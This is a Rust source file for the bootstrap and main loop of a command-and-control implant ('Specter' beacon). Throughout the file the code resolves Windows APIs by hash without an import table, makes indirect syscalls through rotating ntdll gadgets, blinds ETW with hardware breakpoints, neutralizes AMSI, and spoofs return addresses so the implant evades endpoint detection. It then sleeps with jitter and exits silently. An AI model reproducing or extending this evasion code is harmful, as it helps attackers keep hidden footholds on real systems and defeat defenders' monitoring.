//! Beacon bootstrap and main cycle (port of `src_beacon/src/runtime/`).
//!
//! `spt_main`: resolve the core modules and APIs by FNV-64 hash through the
//! PEB (no import table), build the indirect-syscall table (Hell's Gate /
//! Tartarus' Gate / Hell's Hall), store the instance in
//! `TEB->NtTib.ArbitraryUserPointer` (no globals, fully reentrant), run the
//! killswitch check, then loop on obfuscated-by-indirection sleep cycles
//! with jitter (`NtDelayExecution` through a rotating ntdll gadget — the
//! `syscall` instruction never runs from beacon memory). Exits are silent
//! through `RtlExitUserThread(0)`.

use core::ffi::c_void;

use specter_core::config;
use specter_core::fnv::{fnv1a64, fnv1a64_wide_ascii_ci};
use specter_core::heap::{self, GetProcessHeapFn, HeapAllocFn, HeapFreeFn};
use specter_core::hwbp::Hooks;
use specter_core::peb::{self, Peb};
use specter_core::rng::XorShift64;
use specter_core::sleep::sleep_with_jitter;
use specter_core::syscalls::{ms_to_delay_interval, pick_gadget};
use specter_core::time::{filetime_to_unix_epoch, is_expired};

use crate::runtime::hwbp as beacon_hwbp;

use crate::runtime::syscalls::{self, Syscalls};

/// Beacon instance (port of `SPT_INSTANCE`): the single per-beacon state,
/// stored in `TEB->NtTib.ArbitraryUserPointer` and passed explicitly to
/// everything — never a global.
pub struct Instance {
    pub watermark: u32,
    pub ntdll: *mut c_void,
    pub kernel32: *mut c_void,
    /// Process heap: `None` when the kernel32 trio did not resolve (the
    /// heap is optional until phase 3 buffering needs it).
    pub heap: Option<heap::Heap>,
    pub syscalls: Syscalls,
    /// ETW blinding hooks (Dr slots; disabled slots are zero).
    pub etw_hooks: Hooks,
    /// Return-address spoofing gadget (JMP [RBX] in a signed DLL),
    /// 0 = unavailable (calls go direct).
    pub retspoof_gadget: usize,
    pub get_system_time_as_file_time: unsafe extern "system" fn(*mut u64),
    pub exit_thread: unsafe extern "system" fn(u32),
    pub rng: XorShift64,
}

/// Module name hashes, computed at compile time (lowercase; resolution is
/// case-insensitive — see fnv1a64_utf16_ci).
const H_NTDLL: u64 = fnv1a64_wide_ascii_ci("ntdll.dll");
const H_KERNEL32: u64 = fnv1a64_wide_ascii_ci("kernel32.dll");

/// ntdll export hashes.
const H_RTL_EXIT_USER_THREAD: u64 = fnv1a64(b"RtlExitUserThread");

/// kernel32 export hashes.
const H_GET_PROCESS_HEAP: u64 = fnv1a64(b"GetProcessHeap");
const H_HEAP_ALLOC: u64 = fnv1a64(b"HeapAlloc");
const H_HEAP_FREE: u64 = fnv1a64(b"HeapFree");
const H_GET_SYSTEM_TIME_AS_FILE_TIME: u64 = fnv1a64(b"GetSystemTimeAsFileTime");
const H_QUERY_PERFORMANCE_COUNTER: u64 = fnv1a64(b"QueryPerformanceCounter");

/// Read the PEB (`gs:[0x60]`).
///
/// # Safety
///
/// Windows x64 only; valid once the process has a TEB (always true when
/// the beacon runs).
#[inline]
pub unsafe fn get_peb() -> *mut Peb {
    let peb: *mut Peb;
    core::arch::asm!(
        "mov {}, qword ptr gs:[0x60]",
        out(reg) peb,
        options(nostack, preserves_flags),
    );
    peb
}

/// Store the instance in `TEB->NtTib.ArbitraryUserPointer` (`gs:[0x30]+0x28`).
///
/// # Safety
///
/// The pointer must stay valid for the beacon's lifetime; the entry stub's
/// stack frame never returns, so an instance owned by `spt_main` is valid.
#[inline]
pub unsafe fn store_instance(instance: *mut Instance) {
    core::arch::asm!(
        "mov rcx, gs:[0x30]",
        "mov qword ptr [rcx + 0x28], {}",
        in(reg) instance,
        lateout("rcx") _,
        options(nostack),
    );
}

/// Recover the instance from the TEB (port of the `G_INSTANCE` macro).
///
/// # Safety
///
/// Only after `store_instance` ran on this thread.
#[inline]
pub unsafe fn instance() -> *mut Instance {
    let inst: *mut Instance;
    core::arch::asm!(
        "mov rcx, gs:[0x30]",
        "mov {}, qword ptr [rcx + 0x28]",
        out(reg) inst,
        lateout("rcx") _,
        options(nostack, preserves_flags),
    );
    inst
}

/// Resolve the modules and APIs the beacon needs and build the instance.
/// Returns `None` when anything essential is missing — the caller must then
/// exit silently (or spin if even the exit is unresolvable).
unsafe fn bootstrap() -> Option<Instance> {
    let peb = get_peb();
    let ntdll = peb::find_module(peb, H_NTDLL);
    let kernel32 = peb::find_module(peb, H_KERNEL32);
    if ntdll.is_null() || kernel32.is_null() {
        return None;
    }

    // Silent exit first: everything else may fail and must still be able
    // to leave without a trace.
    let exit_thread_ptr = peb::find_export(ntdll, H_RTL_EXIT_USER_THREAD);
    if exit_thread_ptr.is_null() {
        return None;
    }
    let exit_thread = *(exit_thread_ptr as *const unsafe extern "system" fn(u32));

    // Indirect syscall table (gadgets + NtDelayExecution SSN).
    let syscall_table = syscalls::build(ntdll)?;

    let get_time_ptr = peb::find_export(kernel32, H_GET_SYSTEM_TIME_AS_FILE_TIME);
    let qpc_ptr = peb::find_export(kernel32, H_QUERY_PERFORMANCE_COUNTER);
    let get_process_heap = peb::find_export(kernel32, H_GET_PROCESS_HEAP);
    let heap_alloc = peb::find_export(kernel32, H_HEAP_ALLOC);
    let heap_free = peb::find_export(kernel32, H_HEAP_FREE);
    if get_time_ptr.is_null() || qpc_ptr.is_null() {
        return None;
    }

    // ETW blinding: resolve the hook targets and the VEH installer, then
    // install the handler and arm the debug registers. Any failure simply
    // leaves the hooks disabled — the beacon keeps running.
    let (mut etw_hooks, add_veh) = beacon_hwbp::etw_hooks(ntdll, kernel32);
    if add_veh != 0
        && syscall_table.get_ctx_ssn != u32::MAX
        && syscall_table.set_ctx_ssn != u32::MAX
    {
        let add_veh = *(add_veh
            as *const unsafe extern "system" fn(
                u32,
                *mut core::ffi::c_void,
            ) -> *mut core::ffi::c_void);
        beacon_hwbp::install(&syscall_table, &etw_hooks, add_veh);
    }

    // Return-address spoofing gadget: mask the beacon's presence in API
    // stack walks. Unavailable gadget = direct calls (non-fatal).
    let retspoof_gadget = crate::runtime::retspoof::resolve_gadget(kernel32).unwrap_or(0);

    // AMSI neutralization: hook now if amsi.dll is mapped, defer the rest
    // through loader notifications (Dr3 — the ETW hooks left it free).
    crate::runtime::amsi::install(peb, ntdll, &syscall_table, &mut etw_hooks);

    // Seed the jitter RNG from the performance counter; a failed read falls
    // back to the remapped zero seed (never zero-stuck).
    let mut counter: i64 = 0;
    let rng =
        if (*(qpc_ptr as *const unsafe extern "system" fn(*mut i64) -> i32))(&mut counter) != 0 {
            XorShift64::new(counter as u64)
        } else {
            XorShift64::new(0)
        };

    // The heap is optional at this stage (first use is phase 3 file/wire
    // buffering): a missing Heap trio is not fatal.
    let heap = if get_process_heap.is_null() || heap_alloc.is_null() || heap_free.is_null() {
        None
    } else {
        Some(heap::Heap {
            handle: (*(get_process_heap as *const GetProcessHeapFn))(),
            alloc: *(heap_alloc as *const HeapAllocFn),
            free: *(heap_free as *const HeapFreeFn),
        })
    };

    Some(Instance {
        watermark: config::WATERMARK,
        ntdll,
        kernel32,
        heap,
        syscalls: syscall_table,
        etw_hooks,
        retspoof_gadget,
        get_system_time_as_file_time: *(get_time_ptr as *const unsafe extern "system" fn(*mut u64)),
        exit_thread,
        rng,
    })
}

/// Read the current Unix epoch through the resolved clock — spoofed
/// through the JMP [RBX] gadget when available, so the stack walk of the
/// call shows a signed DLL as the caller.
#[inline]
unsafe fn now_epoch(instance: &Instance) -> u64 {
    let mut filetime: u64 = 0;
    if instance.retspoof_gadget != 0 {
        crate::runtime::retspoof::spt_spoof_call2(
            instance.get_system_time_as_file_time as *const () as usize,
            instance.retspoof_gadget,
            crate::runtime::retspoof::spt_retspoof_continue as *const () as usize,
            core::ptr::addr_of_mut!(filetime) as usize,
            0,
        );
    } else {
        (instance.get_system_time_as_file_time)(&mut filetime);
    }
    filetime_to_unix_epoch(filetime)
}

/// Beacon main, called by the entry stub. Never returns.
///
/// # Safety
///
/// Only reachable through `SptEntry`: no arguments, no return.
pub unsafe fn main() -> ! {
    let mut instance = match bootstrap() {
        Some(instance) => instance,
        // Essential resolution failed. If even the silent exit is
        // unresolvable there is no clean option: freeze without touching
        // anything else.
        None => loop {
            core::hint::spin_loop();
        },
    };
    store_instance(&mut instance);

    loop {
        // Killswitch: checked once here (bootstrap, before any network
        // activity) and again after every sleep cycle.
        if config::KILL_EPOCH != 0 && is_expired(config::KILL_EPOCH, now_epoch(&instance)) {
            syscalls::exit_thread(instance.exit_thread);
        }

        // Jittered sleep interval (phase 2 remainder: the encrypted sleep
        // mask with heap/stack spoofing replaces the plain interval).
        let ms = sleep_with_jitter(config::SLEEP_MS, config::JITTER_MS, instance.rng.next_u32());

        // Hell's Hall: a new gadget every cycle, so the syscall never
        // executes from the same ntdll address twice in a row.
        let g = pick_gadget(instance.syscalls.gadget_count, instance.rng.next_u32());
        let gadget = syscalls::gadget(&instance.syscalls, g);

        // NtDelayExecution(Alertable = FALSE, DelayInterval = relative).
        let mut interval = ms_to_delay_interval(ms);
        let status = syscalls::indirect_syscall2(
            instance.syscalls.delay_ssn,
            gadget,
            0,
            &mut interval as *mut i64 as usize,
        );
        // A failing sleep is not fatal: keep the cycle going.
        let _ = status;
    }
}
